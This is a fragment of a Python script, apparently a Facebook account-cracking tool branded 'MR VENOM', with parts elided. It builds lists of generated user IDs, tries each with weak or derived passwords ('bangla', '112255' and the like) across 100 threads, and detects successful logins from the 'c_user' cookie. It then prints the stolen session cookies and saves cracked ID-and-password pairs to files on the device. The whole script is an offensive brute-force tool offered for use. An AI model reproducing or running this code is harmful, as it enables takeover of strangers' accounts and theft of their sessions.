...
\x1b[1;36m{+} \x1b[1;93mTOOL / \x1b[1;92mSTATUS    \x1b[1;97m : \x1b[1;93mRANDOM / \x1b[1;90mACTIVE
\x1b[1;36m{+} \x1b[1;90mTOOL VERSION     \x1b[1;97m: \x1b[1;36m1.0.0
\033[1;96m═════════════════════════════════════════════
""")
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
...
def fuck():
    ...
    for nmbr in range(limit):
        ...
        user.append(nmp)
    with ThreadPool(max_workers=100) as venom:
        os.system('clear')
        print(logo)
        os.system('xdg-open https://www.facebook.com/profile.php?id=Rowdybrandx')
        tl = str(len(user))
        ...
        print('\033[1;37m[\033[1;32m✓\033[1;32m] TOOL CREATED BY MR VENOM JOIN MY GROUP ')
        print('\033[1;37m[\033[1;32m✓\033[1;32m] TOTAL ID : '+tl)
        print('\033[1;32m─────────────────────────────────────────────────────────')
        for guru in user:
            uid = nude+nudex+nud+guru
            pwx = [nude+nudex+nud+guru,nud+guru,nudex+guru,nude+nudex+nud,'bangla','112255','09876543','123412','00009999']
            venom.submit(rcrack,uid,pwx,tl)
    print('\033[1;32m─────────────────────────────────────────────────────────')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f"\033[38;5;46m[VENOM-OK🖤] {uid} • {ps}" '  \n\033[1;33m [💉]\033[1;33mCookie = \033[1;32m'+coki+  ' \n\033[1;33m [🤧] \033[1;32mUa = \033[1;34m'+pro+'  \033[0;97m')
                open('/sdcard/VNM-CMD-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
               #  print(f"\x1b[38;5;196m[VENOM-CP💔] {uid} • {ps}")
                open('/sdcard/VNM-CMD-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
